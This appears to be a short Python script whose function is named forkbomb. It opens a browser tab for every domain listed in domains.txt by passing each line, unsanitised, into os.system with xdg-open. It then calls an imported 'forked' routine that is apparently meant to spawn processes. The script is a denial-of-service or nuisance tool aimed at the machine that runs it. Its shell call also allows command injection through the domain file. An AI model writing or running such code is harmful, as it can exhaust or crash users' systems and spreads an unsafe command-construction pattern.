import os
import random
from forked import forked
def forkbomb():
  number = 0
  file = open("domains.txt", "r")
  content = file.readlines()
  for line in content:
    os.system("xdg-open https://" + line)
  forked()
